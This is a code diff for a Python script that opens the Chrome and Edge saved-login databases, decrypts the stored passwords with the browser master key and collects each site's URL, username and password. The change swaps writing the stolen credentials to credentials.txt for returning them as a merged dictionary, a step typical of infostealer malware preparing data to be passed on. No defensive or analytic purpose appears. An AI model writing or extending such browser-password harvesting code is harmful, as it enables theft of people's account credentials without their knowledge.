@@ -47,15 +47,14 @@ def get_passwords_edge():
 
     try:
         cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+        result = {}
         for r in cursor.fetchall():
             url = r[0]
             username = r[1]
             encrypted_password = r[2]
             decrypted_password = decrypt_password_edge(encrypted_password, master_key)
             if username != "" or decrypted_password != "":
-                with open('credentials.txt', 'a') as credentials_file:
-                    credentials_file.write("-\n  URL: " + url + "\nLogin: '" + username + "'\n Pass: '" + decrypted_password + "'\n")
-                    print("  URL: " + url + "\nLogin: '" + username + "'\n Pass: '" + decrypted_password + "'\n")
+                result[url] = [username, decrypted_password]
     except: pass
 
     cursor.close(); conn.close()
@@ -94,29 +93,29 @@ def main():
     db = sqlite3.connect(file_name)
     cursor = db.cursor()
     cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+    result = {}
     for row in cursor.fetchall():
         action_url = row[1]
         username = row[2]
         password = decrypt_password_chrome(row[3], key)
         if username or password:
-            print(f"  URL: {action_url}")
-            print(f"Login: '{username}'")
-            print(f" Pass: '{password}'")
-            with open('credentials.txt', 'a') as credentials_file:
-                credentials_file.write("-\n  URL: " + action_url + "\nLogin: '" + username + "'\n Pass: '" + password + "'\n")
+            result[action_url] = [username, password]
         else: continue
-        print("-")
     cursor.close(); db.close()
     try: os.remove(file_name)
     except: pass
+    return result
 
 def grab_passwords():
     global file_name, nanoseconds
     file_name, nanoseconds = 116444736000000000, 10000000
-    try: main()
+    try: result = main()
     except: time.sleep(1)
 
-    try: get_passwords_edge()
-    except Exception as err: time.sleep(1)
-    with open('credentials.txt', 'a') as credentials_file:
-        credentials_file.write("-")
+    try: 
+        result2 = get_passwords_edge()
+        for i in result2.keys():
+            result[i] = result2[i]
+    except: time.sleep(1)
+    
+    return result
